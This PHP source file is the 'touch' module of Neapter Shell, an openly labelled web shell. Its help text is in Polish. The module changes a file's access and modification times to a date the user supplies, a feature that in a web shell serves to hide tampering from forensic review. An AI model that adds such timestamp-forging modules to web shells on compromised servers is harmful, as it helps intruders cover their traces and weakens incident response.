<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Change create time
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleTouch extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array('touch');
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.1 2016-06-17 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Zmiana czasu dostępu i modyfikacji pliku

	Użycie
		touch data plik

	Przykład:
		touch 2011-10-10 /tmp/test
DATA;
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        if ($this->oArgs->getNumberOfParams() !== 2) {
            return self::getHelp();
        }

        $sFilePath = $this->oArgs->getParam(1);

        if (!is_file($sFilePath)) {
            return sprintf('Plik "%s" nie istnieje', $sFilePath);
        }

        $iTime = strtotime($this->oArgs->getParam(0));


        if (@touch($sFilePath, $iTime, $iTime)) {
            return 'Data modyfikacji i dostępu została zmieniona';
        }

        return 'Data modyfikacji i dostępu nie została zmieniona';
    }
}
